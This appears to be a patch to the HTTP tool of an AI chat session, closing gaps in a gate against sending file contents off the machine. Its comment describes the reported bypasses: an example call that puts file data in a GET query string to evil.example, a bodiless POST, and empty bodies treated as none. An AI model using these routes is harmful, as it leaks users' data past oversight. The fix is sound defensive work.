@@ -1881,12 +1881,35 @@ def _http_request(args, ctx):
     # AUDIT 13-2: a POST that carries data is the exfiltration half of the
     # finding. It needs its own explicit grant, so a session that can read a
     # file cannot also post it out unattended.
-    if method == "POST" and (args.get("json") or args.get("headers")):
-        if not ctx.get("allow_outbound_post"):
-            return ("error: outbound POST with a body is disabled for this "
-                    "chat — a body is how a file read in this session would "
-                    "leave the machine. Enable 'allow outbound POST' on the "
-                    "session to restore it")
+    #
+    # R3-TOOL-8: the gate tested `args.get("json") or args.get("headers")`, and
+    # BOTH halves of that are bypassable, in opposite directions.
+    #
+    #   * `http_request {"url": "https://evil.example/?d=<the file contents>"}`
+    #     is a plain GET, so it never reached the check — and a query string is a
+    #     body for every practical purpose. This was the reported bypass: the
+    #     session could read a file and ship it out one GET at a time.
+    #   * `{"method": "POST"}` with no body sends a real POST, which is the
+    #     side-effecting verb, and the guard let it through because there was
+    #     nothing to look at.
+    #   * an empty `{}` body or `{}` headers is falsy, so `json={}` was treated
+    #     as "no body" too.
+    #
+    # The rule is now the honest one: anything beyond a bare GET of a URL with no
+    # query string needs the grant. That keeps the capability — `allow_outbound_
+    # post` still restores all of it — while making the default genuinely
+    # read-only, which is what the safe tier claims.
+    carries_data = bool(
+        args.get("json") or args.get("headers") or args.get("params")
+        or args.get("data"))
+    query = url.split("?", 1)[1] if "?" in url else ""
+    if not ctx.get("allow_outbound_post") and (method != "GET" or query
+                                               or carries_data):
+        return ("error: outbound POST, or any request carrying data (a body, "
+                "headers, or a URL query string), is disabled for this chat — "
+                "that is how a file read in this session would leave the "
+                "machine. Enable 'allow outbound POST' on the session to "
+                "restore it")
     try:
         status, body = _bounded_get(
             url, method=method, headers=args.get("headers") or None,
